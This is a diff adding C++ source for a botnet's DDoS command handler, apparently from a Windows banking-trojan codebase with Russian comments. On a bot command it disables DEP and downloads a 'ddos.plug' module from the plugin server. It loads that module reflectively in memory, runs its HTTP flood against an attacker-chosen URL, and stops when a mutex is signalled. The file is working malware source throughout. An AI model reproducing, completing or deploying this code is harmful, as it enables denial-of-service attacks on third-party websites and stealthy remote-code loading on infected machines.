@@ -1,0 +1,86 @@
+#include "ddos.h"
+#include "Plugins.h"
+
+
+
+
+typedef struct
+{
+	char* URL;
+	char* Count;
+	
+} DDos, * PDDos;
+
+DWORD WINAPI RunDDOSThread( LPVOID lpData )
+{
+	DisableDEP();
+
+	if ( !lpData )
+	{
+		return 0;
+	}
+
+	PDDos pData = (PDDos)lpData;
+
+
+
+	char DDOSPlugin[] = {'d','d','o','s','.','p','l','u','g',0};
+
+
+	DWORD dwModuleSize = 0;
+	LPBYTE BotModule   = Plugin::Download(DDOSPlugin, NULL, &dwModuleSize);
+	if (BotModule == NULL)
+		return 0;
+	
+
+
+	
+	int Count =m_atoi(pData->Count);	
+	HMEMORYMODULE HHandle = MemoryLoadLibrary(BotModule);
+	typedef LPVOID (WINAPIV*TMethod)(char*,int);
+	TMethod M = (TMethod)MemoryGetProcAddress(HHandle, (PCHAR)"StartHTTP");
+	if (M != NULL) 
+		M(pData->URL,Count);
+	HANDLE tmp;
+	while ( 1 )// ждем команды на выключение
+	{
+		tmp= (HANDLE)pOpenMutexA(MUTEX_ALL_ACCESS,false, "DDOS");
+		if ((DWORD)pWaitForSingleObject(tmp, INFINITE))
+		{
+			pSleep(100);
+		}
+		else break;
+	}
+
+	
+	M(pData->URL,0);//вызываем эту же функцию с другими параметрами
+	pCloseHandle(tmp);
+	MemFree(BotModule);
+	STR::Free(pData->URL);
+	STR::Free(pData->Count);
+	
+	
+	return 0;
+
+}
+
+bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
+{
+		// Запуск потока DDOS
+	PCHAR Argums=Args;
+	PDDos V = CreateStruct(DDos);
+	if (Args[0]=='s'&&Args[1]=='t'&&Args[2]=='o'&&Args[3]=='p')
+	{
+		HANDLE MutexHandle=(HANDLE)pCreateMutexA(NULL,false,"DDOS");//прекращаем ддос
+		pSleep(1000); 
+		pCloseHandle(MutexHandle);
+	}
+
+	V->URL=STR::GetLeftStr(Argums, " ");
+	V->Count=STR::GetRightStr(Argums, " ");
+
+	   
+	return ((StartThread(RunDDOSThread, V)) ? (true) : (false));
+
+
+}
